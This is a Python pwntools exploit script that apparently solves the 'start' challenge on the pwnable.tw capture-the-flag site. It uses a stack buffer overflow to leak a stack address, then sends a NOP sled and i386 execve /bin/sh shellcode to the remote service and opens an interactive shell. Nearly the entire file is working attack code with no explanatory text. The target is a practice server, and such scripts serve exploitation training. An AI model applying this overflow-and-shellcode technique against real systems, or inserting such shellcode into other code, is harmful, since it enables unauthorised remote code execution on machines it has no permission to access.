from pwn import *

shellcode = ""
shellcode += "\x31\xc9\xf7\xe1\x51"
shellcode += "\x68\x2f\x2f\x73\x68"
shellcode += "\x68\x2f\x62\x69\x6e"
shellcode += "\x89\xe3\xb0\x0b\xcd"
shellcode += "\x80"

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode+="\x68\x68\x2f\x62\x69\x6e\x89"
shellcode+="\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode+="\xcd\x80\x31\xc0\x40\xcd\x80"

#s = process('./start')
s = remote('chall.pwnable.tw',10000)

print s.recv()

#get leak
leak_ins = 0x08048087
payload = ""
payload += "A" * 20
payload += p32(leak_ins)

s.send(payload)

leak = u32(s.recv(4)) - 4	# get accurate readbuffer's address
s.recv(1024)	#read remain data
print "buffer's addr : %s" %hex(leak)
leak += 24
print "shellcode's addr : %s" %hex(leak)

#make new payload with server leak info
payload = ""
payload += "A" * 20
payload += p32(leak)

payload += '\x90' * 6
payload += shellcode #23 bytes

#print len(asm(shellcraft.i386.linux.sh()))
#payload += asm(shellcraft.i386.linux.sh()) #can't use (44bytes)

raw_input("press to send payload")
s.send(payload)
raw_input("press any key")

s.interactive()
